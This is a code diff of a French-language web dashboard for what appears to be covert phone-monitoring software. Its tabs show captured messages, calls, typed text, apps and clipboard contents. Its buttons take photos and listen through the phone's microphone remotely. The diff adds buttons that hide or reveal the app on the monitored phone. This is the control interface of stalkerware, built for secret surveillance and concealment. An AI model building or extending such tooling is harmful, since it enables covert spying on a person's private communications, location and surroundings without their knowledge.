@@ -216,15 +216,20 @@
 
         <!-- Onglets -->
         <div class="msg-tabs" id="msg-tabs">
-          <button class="msg-tab active" data-tab="conversations" onclick="switchMsgTab('conversations')">Conversations</button>
-          <button class="msg-tab" data-tab="typed" onclick="switchMsgTab('typed')">Texte tape</button>
-          <button class="msg-tab" data-tab="calls" onclick="switchMsgTab('calls')">Appels</button>
-          <button class="msg-tab" data-tab="apps" onclick="switchMsgTab('apps')">Applications</button>
-          <button class="msg-tab" data-tab="clipboard" onclick="switchMsgTab('clipboard')">Presse-papiers</button>
+          <button class="msg-tab active" data-tab="messages" onclick="switchMsgTab('messages')">💬 Messages</button>
+          <button class="msg-tab" data-tab="calls" onclick="switchMsgTab('calls')">📞 Appels</button>
+          <button class="msg-tab" data-tab="typed" onclick="switchMsgTab('typed')">⌨️ Texte tape</button>
+          <button class="msg-tab" data-tab="apps" onclick="switchMsgTab('apps')">📱 Applications</button>
+          <button class="msg-tab" data-tab="clipboard" onclick="switchMsgTab('clipboard')">📋 Presse-papiers</button>
         </div>
 
-        <!-- Conversations (WhatsApp, SMS, Telegram...) -->
-        <div class="msg-panel active" id="msg-conversations">
+        <!-- Messages (WhatsApp, SMS, Telegram...) -->
+        <div class="msg-panel active" id="msg-messages">
+          <div id="messages-list"><p class="empty">Aucun message capture. Activez l'acces aux notifications sur le telephone.</p></div>
+        </div>
+
+        <!-- Conversations groupées (ancien, gardé pour compatibilité) -->
+        <div class="msg-panel" id="msg-conversations" style="display:none">
           <div id="conversations-list"><p class="empty">Aucune conversation captee.</p></div>
         </div>
 
@@ -427,6 +432,8 @@
             <button class="btn" id="btn-take-photo" style="background:linear-gradient(135deg,#a855f7,#7c3aed)" onclick="requestPhoto()">📷 Photo</button>
             <button class="btn" id="btn-listen" style="background:linear-gradient(135deg,#f59e0b,#d97706)" onclick="requestListen()">🎤 Écouter</button>
             <button class="btn" id="btn-download-report" style="background:linear-gradient(135deg,#6366f1,#4f46e5)">📄 Rapport PDF</button>
+            <button class="btn" id="btn-show-app" style="background:linear-gradient(135deg,#10b981,#059669)" onclick="setAppVisibility('visible')">👁️ Afficher app</button>
+            <button class="btn" id="btn-hide-app" style="background:linear-gradient(135deg,#ef4444,#dc2626)" onclick="setAppVisibility('hidden')">🙈 Masquer app</button>
           </div>
         </div>
         <div class="stats-grid">
